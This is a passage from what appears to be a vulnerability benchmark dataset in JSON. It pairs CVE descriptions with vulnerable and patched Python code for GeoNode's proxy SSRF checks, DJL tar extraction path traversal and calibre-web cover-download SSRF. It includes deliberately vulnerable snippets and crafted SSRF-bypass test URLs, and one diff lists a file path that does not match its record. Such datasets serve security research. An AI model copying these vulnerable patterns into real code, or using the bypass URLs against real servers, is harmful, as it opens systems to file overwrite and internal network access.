   Service.objects.get_or_create(\n            type=WMS,\n            name=\"Bogus\",\n            title=\"Pocus\",\n            owner=self.admin,\n            method=INDEXED,\n            base_url=\"http://bogus.pocus.com/ows\",\n        )\n        response = self.client.get(f\"{self.proxy_url}?url=http://bogus.pocus.com/ows/wms?request=GetCapabilities\")\n        # 200 - FOUND\n        self.assertTrue(response.status_code in (200, 301))\n\n    @override_settings(DEBUG=False, PROXY_ALLOWED_HOSTS=(\".example.org\",))\n    def test_relative_urls(self):\n        \"\"\"Proxying to a URL with a relative path element should normalise the path into\n        an absolute path before calling the remote URL.\"\"\"\n        import geonode.proxy.views\n\n        class Response:\n            status_code = 200\n            content = \"Hello World\"\n            headers = {\"Content-Type\": \"text/html\"}\n\n        request_mock = MagicMock()\n        request_mock.return_value = (Response(), None)\n\n        geonode.proxy.views.http_client.request = request_mock\n        url = \"http://example.org/test/test/../../index.html\"\n\n        self.client.get(f\"{self.proxy_url}?url={url}\")\n        assert request_mock.call_args[0][0] == \"http://example.org/index.html\"\n\n    def test_proxy_preserve_headers(self):\n        \"\"\"The GeoNode Proxy should preserve the original request headers.\"\"\"\n        import geonode.proxy.views\n\n        _test_headers = {\n            \"Access-Control-Allow-Credentials\": False,\n            \"Access-Control-Allow-Headers\": \"Content-Type, Accept, Authorization, Origin, User-Agent\",\n            \"Access-Control-Allow-Methods\": \"GET, POST, PUT, PATCH, OPTIONS\",\n            \"Cache-Control\": \"public, must-revalidate, max-age = 30\",\n            \"Connection\": \"keep-alive\",\n            \"Content-Language\": \"en\",\n            \"Content-Length\": 116559,\n            \"Content-Type\": \"image/tiff\",\n            \"Content-Disposition\": 'attachment; filename=\"filename.tif\"',\n            \"Date\": \"Fri, 05 Nov 2021 17: 19: 11 GMT\",\n            \"Server\": \"nginx/1.17.2\",\n            \"Set-Cookie\": \"sessionid = bogus-pocus; HttpOnly; Path=/; SameSite=Lax\",\n            \"Strict-Transport-Security\": \"max-age=3600; includeSubDomains\",\n            \"Vary\": \"Authorization, Accept-Language, Cookie, origin\",\n            \"X-Content-Type-Options\": \"nosniff\",\n            \"X-XSS-Protection\": \"1; mode=block\",\n        }\n\n        class Response:\n            status_code = 200\n            content = \"Hello World\"\n            headers = _test_headers\n\n        request_mock = MagicMock()\n        request_mock.return_value = (Response(), None)\n\n        geonode.proxy.views.http_client.request = request_mock\n        url = \"http://example.org/test/test/../../image.tiff\"\n\n        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n        self.assertDictContainsSubset(\n            dict(response.headers.copy()),\n            {\n                \"Content-Type\": \"text/plain\",\n                \"Vary\": \"Authorization, Accept-Language, Cookie, origin\",\n                \"X-Content-Type-Options\": \"nosniff\",\n                \"X-XSS-Protection\": \"1; mode=block\",\n                \"Referrer-Policy\": \"same-origin\",\n                \"X-Frame-Options\": \"SAMEORIGIN\",\n                \"Content-Language\": \"en-us\",\n                \"Content-Length\": \"119\",\n                \"Content-Disposition\": 'attachment; filename=\"filename.tif\"',\n            },\n        )\n\n\nclass DownloadResourceTestCase(GeoNodeBaseTestSupport):\n    def setUp(self):\n        super().setUp()\n        self.maxDiff = None\n        create_models(type=\"dataset\")\n\n    @on_ogc_backend(geoserver.BACKEND_PACKAGE)\n    def test_download_url_with_not_existing_file(self):\n        dataset = Dataset.objects.all().first()\n        self.client.login(username=\"admin\", password=\"admin\")\n        # ... all should be good\n        response = self.client.get(reverse(\"download\", args=(dataset.id,)))\n        # Espected 404 since there are no files available for this layer\n        self.assertEqual(response.status_code, 404)\n        content = response.content\n        if isinstance(content, bytes):\n            content = content.decode(\"UTF-8\")\n        data = content\n        self.assertTrue(\"No files have been found for this resource. Please, contact a system administrator.\" in data)\n\n    @patch(\"geonode.storage.manager.storage_manager.exists\")\n    @patch(\"geonode.storage.manager.storage_manager.open\")\n    @on_ogc_backend(geoserver.BACKEND_PACKAGE)\n    def test_download_url_with_existing_files(self, fopen, fexists):\n        fexists.return_value = True\n        fopen.return_value = SimpleUploadedFile(\"foo_file.shp\", b\"scc\")\n        dataset = Dataset.objects.all().first()\n\n        dataset.files = [\n            \"/tmpe1exb9e9/foo_file.dbf\",\n            \"/tmpe1exb9e9/foo_file.prj\",\n            \"/tmpe1exb9e9/foo_file.shp\",\n            \"/tmpe1exb9e9/foo_file.shx\",\n        ]\n\n        dataset.save()\n\n        dataset.refresh_from_db()\n\n        upload = Upload.objects.create(state=\"RUNNING\", resource=dataset)\n\n        assert upload\n\n        self.client.login(username=\"admin\", password=\"admin\")\n        # ... all should be good\n        response = self.client.get(reverse(\"download\", args=(dataset.id,)))\n        # Espected 404 since there are no files available for this layer\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(\"application/zip\", response.headers.get(\"Content-Type\"))\n        self.assertEqual('attachment; filename=\"CA.zip\"', response.headers.get(\"Content-Disposition\"))\n\n    @patch(\"geonode.storage.manager.storage_manager.exists\")\n    @patch(\"geonode.storage.manager.storage_manager.open\")\n    @on_ogc_backend(geoserver.BACKEND_PACKAGE)\n    def test_download_files(self, fopen, fexists):\n        fexists.return_value = True\n        fopen.return_value = SimpleUploadedFile(\"foo_file.shp\", b\"scc\")\n        dataset = Dataset.objects.all().first()\n\n        dataset.files = [\n            \"/tmpe1exb9e9/foo_file.dbf\",\n            \"/tmpe1exb9e9/foo_file.prj\",\n            \"/tmpe1exb9e9/foo_file.shp\",\n            \"/tmpe1exb9e9/foo_file.shx\",\n        ]\n\n        dataset.save()\n\n        dataset.refresh_from_db()\n\n        Upload.objects.create(state=\"COMPLETE\", resource=dataset)\n\n        self.client.login(username=\"admin\", password=\"admin\")\n        response = self.client.get(reverse(\"download\", args=(dataset.id,)))\n        # headers and status assertions\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.get(\"content-type\"), \"application/zip\")\n        self.assertEqual(response.get(\"content-disposition\"), f'attachment; filename=\"{dataset.name}.zip\"')\n        # Inspect content\n        zip_content = io.BytesIO(b\"\".join(response.streaming_content))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_160_1",
        "commit": "a9eebae",
        "file_path": "geonode/proxy/tests.py",
        "start_line": 70,
        "end_line": 268,
        "snippet": "    @override_settings(DEBUG=True, PROXY_ALLOWED_HOSTS=())\n    def test_validate_host_disabled_in_debug(self):\n        \"\"\"If PROXY_ALLOWED_HOSTS is empty and DEBUG is True, all hosts pass the proxy.\"\"\"\n        response = self.client.get(f\"{self.proxy_url}?url={self.url}\")\n        if response.status_code != 404:  # 404 - NOT FOUND\n            self.assertTrue(response.status_code in (200, 301), response.status_code)\n\n    @override_settings(DEBUG=False, PROXY_ALLOWED_HOSTS=())\n    def test_validate_host_disabled_not_in_debug(self):\n        \"\"\"If PROXY_ALLOWED_HOSTS is empty and DEBUG is False requests should return 403.\"\"\"\n        response = self.client.get(f\"{self.proxy_url}?url={self.url}\")\n        if response.status_code != 404:  # 404 - NOT FOUND\n            self.assertEqual(response.status_code, 403, response.status_code)\n\n    @override_settings(DEBUG=False, PROXY_ALLOWED_HOSTS=(TEST_DOMAIN,))\n    def test_proxy_allowed_host(self):\n        \"\"\"If PROXY_ALLOWED_HOSTS is not empty and DEBUG is False requests should return no error.\"\"\"\n        self.client.login(username=\"admin\", password=\"admin\")\n        response = self.client.get(f\"{self.proxy_url}?url={self.url}\")\n        if response.status_code != 404:  # 404 - NOT FOUND\n            self.assertEqual(response.status_code, 200, response.status_code)\n\n    @override_settings(DEBUG=False, PROXY_ALLOWED_HOSTS=())\n    def test_validate_remote_services_hosts(self):\n        \"\"\"If PROXY_ALLOWED_HOSTS is empty and DEBUG is False requests should return 200\n        for Remote Services hosts.\"\"\"\n        from geonode.services.models import Service\n        from geonode.services.enumerations import WMS, INDEXED\n\n        Service.objects.get_or_create(\n            type=WMS,\n            name=\"Bogus\",\n            title=\"Pocus\",\n            owner=self.admin,\n            method=INDEXED,\n            base_url=\"http://bogus.pocus.com/ows\",\n        )\n        response = self.client.get(f\"{self.proxy_url}?url=http://bogus.pocus.com/ows/wms?request=GetCapabilities\")\n        # 200 - FOUND\n        self.assertTrue(response.status_code in (200, 301))\n\n    @override_settings(DEBUG=False, PROXY_ALLOWED_HOSTS=(\".example.org\",))\n    def test_relative_urls(self):\n        \"\"\"Proxying to a URL with a relative path element should normalise the path into\n        an absolute path before calling the remote URL.\"\"\"\n        import geonode.proxy.views\n\n        class Response:\n            status_code = 200\n            content = \"Hello World\"\n            headers = {\"Content-Type\": \"text/html\"}\n\n        request_mock = MagicMock()\n        request_mock.return_value = (Response(), None)\n\n        geonode.proxy.views.http_client.request = request_mock\n        url = \"http://example.org/test/test/../../index.html\"\n\n        self.client.get(f\"{self.proxy_url}?url={url}\")\n        assert request_mock.call_args[0][0] == \"http://example.org/index.html\"\n\n    def test_proxy_preserve_headers(self):\n        \"\"\"The GeoNode Proxy should preserve the original request headers.\"\"\"\n        import geonode.proxy.views\n\n        _test_headers = {\n            \"Access-Control-Allow-Credentials\": False,\n            \"Access-Control-Allow-Headers\": \"Content-Type, Accept, Authorization, Origin, User-Agent\",\n            \"Access-Control-Allow-Methods\": \"GET, POST, PUT, PATCH, OPTIONS\",\n            \"Cache-Control\": \"public, must-revalidate, max-age = 30\",\n            \"Connection\": \"keep-alive\",\n            \"Content-Language\": \"en\",\n            \"Content-Length\": 116559,\n            \"Content-Type\": \"image/tiff\",\n            \"Content-Disposition\": 'attachment; filename=\"filename.tif\"',\n            \"Date\": \"Fri, 05 Nov 2021 17: 19: 11 GMT\",\n            \"Server\": \"nginx/1.17.2\",\n            \"Set-Cookie\": \"sessionid = bogus-pocus; HttpOnly; Path=/; SameSite=Lax\",\n            \"Strict-Transport-Security\": \"max-age=3600; includeSubDomains\",\n            \"Vary\": \"Authorization, Accept-Language, Cookie, origin\",\n            \"X-Content-Type-Options\": \"nosniff\",\n            \"X-XSS-Protection\": \"1; mode=block\",\n        }\n\n        class Response:\n            status_code = 200\n            content = \"Hello World\"\n            headers = _test_headers\n\n        request_mock = MagicMock()\n        request_mock.return_value = (Response(), None)\n\n        geonode.proxy.views.http_client.request = request_mock\n        url = \"http://example.org/test/test/../../image.tiff\"\n\n        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n        self.assertDictContainsSubset(\n            dict(response.headers.copy()),\n            {\n                \"Content-Type\": \"text/plain\",\n                \"Vary\": \"Authorization, Accept-Language, Cookie, origin\",\n                \"X-Content-Type-Options\": \"nosniff\",\n                \"X-XSS-Protection\": \"1; mode=block\",\n                \"Referrer-Policy\": \"same-origin\",\n                \"X-Frame-Options\": \"SAMEORIGIN\",\n                \"Content-Language\": \"en-us\",\n                \"Content-Length\": \"119\",\n                \"Content-Disposition\": 'attachment; filename=\"filename.tif\"',\n            },\n        )\n\n    def test_proxy_url_forgery(self):\n        \"\"\"The GeoNode Proxy should preserve the original request headers.\"\"\"\n        import geonode.proxy.views\n        from urllib.parse import urlsplit\n\n        class Response:\n            status_code = 200\n            content = \"Hello World\"\n            headers = {\n                \"Content-Type\": \"text/plain\",\n                \"Vary\": \"Authorization, Accept-Language, Cookie, origin\",\n                \"X-Content-Type-Options\": \"nosniff\",\n                \"X-XSS-Protection\": \"1; mode=block\",\n                \"Referrer-Policy\": \"same-origin\",\n                \"X-Frame-Options\": \"SAMEORIGIN\",\n                \"Content-Language\": \"en-us\",\n                \"Content-Length\": \"119\",\n                \"Content-Disposition\": 'attachment; filename=\"filename.tif\"',\n            }\n\n        request_mock = MagicMock()\n        request_mock.return_value = (Response(), None)\n\n        # Non-Legit requests attempting SSRF\n        geonode.proxy.views.http_client.request = request_mock\n        url = f\"http://example.org\\@%23{urlsplit(settings.SITEURL).hostname}\"\n\n        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n        self.assertEqual(response.status_code, 403)\n\n        url = f\"http://125.126.127.128\\@%23{urlsplit(settings.SITEURL).hostname}\"\n\n        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n        self.assertEqual(response.status_code, 403)\n\n        # Legit requests using the local host (SITEURL)\n        url = f\"/\\@%23{urlsplit(settings.SITEURL).hostname}\"\n\n        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n        self.assertEqual(response.status_code, 200)\n\n        url = f\"{settings.SITEURL}\\@%23{urlsplit(settings.SITEURL).hostname}\"\n\n        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n        self.assertEqual(response.status_code, 200)\n\n\nclass DownloadResourceTestCase(GeoNodeBaseTestSupport):\n    def setUp(self):\n        super().setUp()\n        self.maxDiff = None\n        create_models(type=\"dataset\")\n\n    @on_ogc_backend(geoserver.BACKEND_PACKAGE)\n    def test_download_url_with_not_existing_file(self):\n        dataset = Dataset.objects.all().first()\n        self.client.login(username=\"admin\", password=\"admin\")\n        # ... all should be good\n        response = self.client.get(reverse(\"download\", args=(dataset.id,)))\n        # Espected 404 since there are no files available for this layer\n        self.assertEqual(response.status_code, 404)\n        content = response.content\n        if isinstance(content, bytes):\n            content = content.decode(\"UTF-8\")\n        data = content\n        self.assertTrue(\"No files have been found for this resource. Please, contact a system administrator.\" in data)\n\n    @patch(\"geonode.storage.manager.storage_manager.exists\")\n    @patch(\"geonode.storage.manager.storage_manager.open\")\n    @on_ogc_backend(geoserver.BACKEND_PACKAGE)\n    def test_download_url_with_existing_files(self, fopen, fexists):\n        fexists.return_value = True\n        fopen.return_value = SimpleUploadedFile(\"foo_file.shp\", b\"scc\")\n        dataset = Dataset.objects.all().first()\n\n        dataset.files = [\n            \"/tmpe1exb9e9/foo_file.dbf\",\n            \"/tmpe1exb9e9/foo_file.prj\",\n            \"/tmpe1exb9e9/foo_file.shp\",\n            \"/tmpe1exb9e9/foo_file.shx\",\n        ]\n\n        dataset.save()\n\n        dataset.refresh_from_db()\n\n        upload = Upload.objects.create(state=\"RUNNING\", resource=dataset)\n"
      },
      {
        "id": "fix_py_160_2",
        "commit": "a9eebae",
        "file_path": "geonode/utils.py",
        "start_line": 1934,
        "end_line": 1953,
        "snippet": "def extract_ip_or_domain(url):\n    ip_regex = re.compile(\"^(?:http\\:\\/\\/|https\\:\\/\\/)(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\")\n    domain_regex = re.compile(\"^(?:http\\:\\/\\/|https\\:\\/\\/)([a-zA-Z0-9.-]+)\")\n\n    match = ip_regex.findall(url)\n    if len(match):\n        ip_address = match[0]\n        try:\n            ipaddress.ip_address(ip_address)  # Validate the IP address\n            return ip_address\n        except ValueError:\n            pass\n\n    match = domain_regex.findall(url)\n    if len(match):\n        return match[0]\n\n    return None\n\n"
      }
    ],
    "vul_patch": "--- a/geonode/proxy/tests.py\n+++ b/geonode/proxy/tests.py\n@@ -1,10 +1,3 @@\n-        self.maxDiff = None\n-        self.admin = get_user_model().objects.get(username=\"admin\")\n-\n-        # FIXME(Ariel): These tests do not work when the computer is offline.\n-        self.proxy_url = \"/proxy/\"\n-        self.url = TEST_URL\n-\n     @override_settings(DEBUG=True, PROXY_ALLOWED_HOSTS=())\n     def test_validate_host_disabled_in_debug(self):\n         \"\"\"If PROXY_ALLOWED_HOSTS is empty and DEBUG is True, all hosts pass the proxy.\"\"\"\n@@ -116,6 +109,52 @@\n             },\n         )\n \n+    def test_proxy_url_forgery(self):\n+        \"\"\"The GeoNode Proxy should preserve the original request headers.\"\"\"\n+        import geonode.proxy.views\n+        from urllib.parse import urlsplit\n+\n+        class Response:\n+            status_code = 200\n+            content = \"Hello World\"\n+            headers = {\n+                \"Content-Type\": \"text/plain\",\n+                \"Vary\": \"Authorization, Accept-Language, Cookie, origin\",\n+                \"X-Content-Type-Options\": \"nosniff\",\n+                \"X-XSS-Protection\": \"1; mode=block\",\n+                \"Referrer-Policy\": \"same-origin\",\n+                \"X-Frame-Options\": \"SAMEORIGIN\",\n+                \"Content-Language\": \"en-us\",\n+                \"Content-Length\": \"119\",\n+                \"Content-Disposition\": 'attachment; filename=\"filename.tif\"',\n+            }\n+\n+        request_mock = MagicMock()\n+        request_mock.return_value = (Response(), None)\n+\n+        # Non-Legit requests attempting SSRF\n+        geonode.proxy.views.http_client.request = request_mock\n+        url = f\"http://example.org\\@%23{urlsplit(settings.SITEURL).hostname}\"\n+\n+        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n+        self.assertEqual(response.status_code, 403)\n+\n+        url = f\"http://125.126.127.128\\@%23{urlsplit(settings.SITEURL).hostname}\"\n+\n+        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n+        self.assertEqual(response.status_code, 403)\n+\n+        # Legit requests using the local host (SITEURL)\n+        url = f\"/\\@%23{urlsplit(settings.SITEURL).hostname}\"\n+\n+        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n+        self.assertEqual(response.status_code, 200)\n+\n+        url = f\"{settings.SITEURL}\\@%23{urlsplit(settings.SITEURL).hostname}\"\n+\n+        response = self.client.get(f\"{self.proxy_url}?url={url}\")\n+        self.assertEqual(response.status_code, 200)\n+\n \n class DownloadResourceTestCase(GeoNodeBaseTestSupport):\n     def setUp(self):\n@@ -157,43 +196,3 @@\n         dataset.refresh_from_db()\n \n         upload = Upload.objects.create(state=\"RUNNING\", resource=dataset)\n-\n-        assert upload\n-\n-        self.client.login(username=\"admin\", password=\"admin\")\n-        # ... all should be good\n-        response = self.client.get(reverse(\"download\", args=(dataset.id,)))\n-        # Espected 404 since there are no files available for this layer\n-        self.assertEqual(response.status_code, 200)\n-        self.assertEqual(\"application/zip\", response.headers.get(\"Content-Type\"))\n-        self.assertEqual('attachment; filename=\"CA.zip\"', response.headers.get(\"Content-Disposition\"))\n-\n-    @patch(\"geonode.storage.manager.storage_manager.exists\")\n-    @patch(\"geonode.storage.manager.storage_manager.open\")\n-    @on_ogc_backend(geoserver.BACKEND_PACKAGE)\n-    def test_download_files(self, fopen, fexists):\n-        fexists.return_value = True\n-        fopen.return_value = SimpleUploadedFile(\"foo_file.shp\", b\"scc\")\n-        dataset = Dataset.objects.all().first()\n-\n-        dataset.files = [\n-            \"/tmpe1exb9e9/foo_file.dbf\",\n-            \"/tmpe1exb9e9/foo_file.prj\",\n-            \"/tmpe1exb9e9/foo_file.shp\",\n-            \"/tmpe1exb9e9/foo_file.shx\",\n-        ]\n-\n-        dataset.save()\n-\n-        dataset.refresh_from_db()\n-\n-        Upload.objects.create(state=\"COMPLETE\", resource=dataset)\n-\n-        self.client.login(username=\"admin\", password=\"admin\")\n-        response = self.client.get(reverse(\"download\", args=(dataset.id,)))\n-        # headers and status assertions\n-        self.assertEqual(response.status_code, 200)\n-        self.assertEqual(response.get(\"content-type\"), \"application/zip\")\n-        self.assertEqual(response.get(\"content-disposition\"), f'attachment; filename=\"{dataset.name}.zip\"')\n-        # Inspect content\n-        zip_content = io.BytesIO(b\"\".join(response.streaming_content))\n\n--- /dev/null\n+++ b/geonode/proxy/tests.py\n@@ -0,0 +1,19 @@\n+def extract_ip_or_domain(url):\n+    ip_regex = re.compile(\"^(?:http\\:\\/\\/|https\\:\\/\\/)(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\")\n+    domain_regex = re.compile(\"^(?:http\\:\\/\\/|https\\:\\/\\/)([a-zA-Z0-9.-]+)\")\n+\n+    match = ip_regex.findall(url)\n+    if len(match):\n+        ip_address = match[0]\n+        try:\n+            ipaddress.ip_address(ip_address)  # Validate the IP address\n+            return ip_address\n+        except ValueError:\n+            pass\n+\n+    match = domain_regex.findall(url)\n+    if len(match):\n+        return match[0]\n+\n+    return None\n+\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-2914",
    "cve_description": "A TarSlip vulnerability exists in the deepjavalibrary/djl, affecting version 0.26.0 and fixed in version 0.27.0. This vulnerability allows an attacker to manipulate file paths within tar archives to overwrite arbitrary files on the target system. Exploitation of this vulnerability could lead to remote code execution, privilege escalation, data theft or manipulation, and denial of service. The vulnerability is due to improper validation of file paths during the extraction of tar files, as demonstrated in multiple occurrences within the library's codebase, including but not limited to the files_util.py and extract_imagenet.py scripts.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/deepjavalibrary/djl",
    "patch_url": [
      "https://github.com/deepjavalibrary/djl/commit/5235be508cec9e8cb6f496a4ed2fa40e4f62c370"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_328_1",
        "commit": "64c1b96",
        "file_path": "extensions/spark/setup/djl_spark/util/files_util.py",
        "start_line": 67,
        "end_line": 86,
        "snippet": "def download_and_extract(url, path):\n    \"\"\"Download and extract a tar file.\n\n    :param url: The url of the tar file.\n    :param path: The path to the file to download to.\n    \"\"\"\n    if not os.path.exists(path):\n        os.makedirs(path)\n    if not os.listdir(path):\n        with tmpdir() as tmp:\n            tmp_file = os.path.join(tmp, \"tar_file\")\n            if url.startswith(\"s3://\"):\n                s3_download(url, tmp_file)\n                with tarfile.open(name=tmp_file, mode=\"r:gz\") as t:\n                    t.extractall(path=path)\n            elif url.startswith(\"http://\") or url.startswith(\"https://\"):\n                with urlopen(url) as response, open(tmp_file, 'wb') as f:\n                    shutil.copyfileobj(response, f)\n                with tarfile.open(name=tmp_file, mode=\"r:gz\") as t:\n                    t.extractall(path=path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_328_1",
        "commit": "5235be508cec9e8cb6f496a4ed2fa40e4f62c370",
        "file_path": "extensions/spark/setup/djl_spark/util/files_util.py",
        "start_line": 67,
        "end_line": 100,
        "snippet": "def download_and_extract(url, path):\n    \"\"\"Download and extract a tar file.\n\n    :param url: The url of the tar file.\n    :param path: The path to the file to download to.\n    \"\"\"\n    def is_within_directory(directory, target):\n        abs_directory = os.path.abspath(directory)\n        abs_target = os.path.abspath(target)\n        prefix = os.path.commonprefix([abs_directory, abs_target])\n        return prefix == abs_directory\n\n    def safe_extract(tar, path=\".\", members=None, *, numeric_owner=False):\n        for member in tar.getmembers():\n            member_path = os.path.join(path, member.name)\n            if not is_within_directory(path, member_path):\n                raise Exception(\"Attempted Path Traversal in Tar File\")\n\n        tar.extractall(path, members, numeric_owner=numeric_owner)\n\n    if not os.path.exists(path):\n        os.makedirs(path)\n    if not os.listdir(path):\n        with tmpdir() as tmp:\n            tmp_file = os.path.join(tmp, \"tar_file\")\n            if url.startswith(\"s3://\"):\n                s3_download(url, tmp_file)\n                with tarfile.open(name=tmp_file, mode=\"r:gz\") as t:\n                    safe_extract(t, path=path)\n            elif url.startswith(\"http://\") or url.startswith(\"https://\"):\n                with urlopen(url) as response, open(tmp_file, 'wb') as f:\n                    shutil.copyfileobj(response, f)\n                with tarfile.open(name=tmp_file, mode=\"r:gz\") as t:\n                    safe_extract(t, path=path)"
      }
    ],
    "vul_patch": "--- a/extensions/spark/setup/djl_spark/util/files_util.py\n+++ b/extensions/spark/setup/djl_spark/util/files_util.py\n@@ -4,6 +4,20 @@\n     :param url: The url of the tar file.\n     :param path: The path to the file to download to.\n     \"\"\"\n+    def is_within_directory(directory, target):\n+        abs_directory = os.path.abspath(directory)\n+        abs_target = os.path.abspath(target)\n+        prefix = os.path.commonprefix([abs_directory, abs_target])\n+        return prefix == abs_directory\n+\n+    def safe_extract(tar, path=\".\", members=None, *, numeric_owner=False):\n+        for member in tar.getmembers():\n+            member_path = os.path.join(path, member.name)\n+            if not is_within_directory(path, member_path):\n+                raise Exception(\"Attempted Path Traversal in Tar File\")\n+\n+        tar.extractall(path, members, numeric_owner=numeric_owner)\n+\n     if not os.path.exists(path):\n         os.makedirs(path)\n     if not os.listdir(path):\n@@ -12,9 +26,9 @@\n             if url.startswith(\"s3://\"):\n                 s3_download(url, tmp_file)\n                 with tarfile.open(name=tmp_file, mode=\"r:gz\") as t:\n-                    t.extractall(path=path)\n+                    safe_extract(t, path=path)\n             elif url.startswith(\"http://\") or url.startswith(\"https://\"):\n                 with urlopen(url) as response, open(tmp_file, 'wb') as f:\n                     shutil.copyfileobj(response, f)\n                 with tarfile.open(name=tmp_file, mode=\"r:gz\") as t:\n-                    t.extractall(path=path)\n+                    safe_extract(t, path=path)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-0766",
    "cve_description": "Server-Side Request Forgery (SSRF) in GitHub repository janeczku/calibre-web prior to 0.6.17.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/janeczku/calibre-web",
    "patch_url": [
      "https://github.com/janeczku/calibre-web/commit/965352c8d96c9eae7a6867ff76b0db137d04b0b8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_214_1",
        "commit": "8007e45",
        "file_path": "cps/helper.py",
        "start_line": 732,
        "end_line": 751,
        "snippet": "def save_cover_from_url(url, book_path):\n    try:\n        if not cli.allow_localhost:\n            # 127.0.x.x, localhost, [::1], [::ffff:7f00:1]\n            ip = socket.getaddrinfo(urlparse(url).hostname, 0)[0][4][0]\n            if ip.startswith(\"127.\") or ip.startswith('::ffff:7f') or ip == \"::1\":\n                log.error(\"Localhost was accessed for cover upload\")\n                return False, _(\"You are not allowed to access localhost for cover uploads\")\n        img = requests.get(url, timeout=(10, 200))      # ToDo: Error Handling\n        img.raise_for_status()\n        return save_cover(img, book_path)\n    except (socket.gaierror,\n            requests.exceptions.HTTPError,\n            requests.exceptions.ConnectionError,\n            requests.exceptions.Timeout) as ex:\n        log.info(u'Cover Download Error %s', ex)\n        return False, _(\"Error Downloading Cover\")\n    except MissingDelegateError as ex:\n        log.info(u'File Format Error %s', ex)\n        return False, _(\"Cover Format Error\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_214_1",
        "commit": "965352c",
        "file_path": "cps/helper.py",
        "start_line": 732,
        "end_line": 751,
        "snippet": "def save_cover_from_url(url, book_path):\n    try:\n        if not cli.allow_localhost:\n            # 127.0.x.x, localhost, [::1], [::ffff:7f00:1]\n            ip = socket.getaddrinfo(urlparse(url).hostname, 0)[0][4][0]\n            if ip.startswith(\"127.\") or ip.startswith('::ffff:7f') or ip == \"::1\" or ip == \"0.0.0.0\" or ip == \"::\":\n                log.error(\"Localhost was accessed for cover upload\")\n                return False, _(\"You are not allowed to access localhost for cover uploads\")\n        img = requests.get(url, timeout=(10, 200), allow_redirects=False)      # ToDo: Error Handling\n        img.raise_for_status()\n        return save_cover(img, book_path)\n    except (socket.gaierror,\n            requests.exceptions.HTTPError,\n            requests.exceptions.ConnectionError,\n            requests.exceptions.Timeout) as ex:\n        log.info(u'Cover Download Error %s', ex)\n        return False, _(\"Error Downloading Cover\")\n    except MissingDelegateError as ex:\n        log.info(u'File Format Error %s', ex)\n        return False, _(\"Cover Format Error\")"
      }
    ],
    "vul_patch": "--- a/cps/helper.py\n+++ b/cps/helper.py\n@@ -3,10 +3,10 @@\n         if not cli.allow_localhost:\n             # 127.0.x.x, localhost, [::1], [::ffff:7f00:1]\n             ip = socket.getaddrinfo(urlparse(url).hostname, 0)[0][4][0]\n-            if ip.startswith(\"127.\") or ip.startswith('::ffff:7f') or ip == \"::1\":\n+            if ip.startswith(\"127.\") or ip.startswith('::ffff:7f') or ip == \"::1\" or ip == \"0.0.0.0\" or ip == \"::\":\n                 log.error(\"Localhost was accessed for cover upload\")\n                 return False, _(\"You are not allowed to access localhost for cover uploads\")\n-        img = requests.get(url, timeout=(10, 200))      # ToDo: Error Handling\n+        img = requests.get(url, timeout=(10, 200), allow_redirects=False)      # ToDo: Error Handling\n         img.raise_for_status()\n         return save_cover(img, book_path)\n     except (socket.gaierror,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-21513",
    "cve_description": "Versions of the package langchain-experimental from 0.0.15 and before 0.0.21 are vulnerable to Arbitrary Code Execution when retrieving values from the database, the code will attempt to call 'eval' on all values. An attacker can exploit this vulnerability and execute arbitrary python code if they can control the input prompt and the server is configured with VectorSQLDatabaseChain.\r\r**Notes:**\r\rImpact on the Confidentiality, Integrity and Availability of the vulnerable component:\r\rConfidentiality: Code execution happens within the impacted component, in this case langchain-experimental, so all resources are necessarily accessible.\r\rIntegrity: There is nothing protected by the impacted component inherently. Although anything returned from the component counts as 'information' for which the trustworthiness can be compromised.\r\rAvailability: The loss of availability isn't caused by the attack itself, but it happens as a result during the attacker's post-exploitation steps.\r\r\rImpact on the Confidentiality, Integrity and Availability of the subsequent system:\r\rAs a legitimate low-privileged user of the package (PR:L) the attacker does not have more access to data owned by the package as a result of this vulnerability than they did with normal usage (e.g. can query the DB). The unintended action that one can perform by breaking out of the app environment and exfiltrating files, making remote connections etc. happens during the post exploitation phase in the subsequent system - in this case, the OS.\r\rAT:P: An attacker needs to be able to influence the input prompt, whilst the server is configured with the VectorSQLDatabaseChain plugin.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
